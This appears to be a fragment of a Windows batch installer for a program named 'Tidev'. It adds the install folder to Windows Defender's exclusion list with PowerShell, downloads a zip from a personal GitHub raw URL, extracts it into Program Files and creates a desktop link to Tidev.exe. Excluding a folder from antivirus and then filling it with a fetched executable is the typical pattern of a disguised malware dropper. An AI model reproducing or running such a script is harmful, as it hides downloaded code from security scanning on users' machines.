...
echo.
powershell Add-MpPreference -ExclusionPath 'C:\Program Files\Tidev'
...
echo.
powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/khathiatz/tidev/master/tidev_install_pack.zip','C:\Program Files\Tidev\tidev_install_pack.zip')
...
echo.
PowerShell Expand-Archive -Path 'C:\Program Files\Tidev\tidev_install_pack.zip' -DestinationPath 'C:\Program Files\Tidev\'
del "C:\Program Files\Tidev\tidev_install_pack.zip"
...
echo.
mklink "%userprofile%\Desktop\Tidev" "C:\Program Files\Tidev\Tidev.exe"
...
if not exist "C:\Program Files\Tidev\Tidev.exe" GOTO InstallError
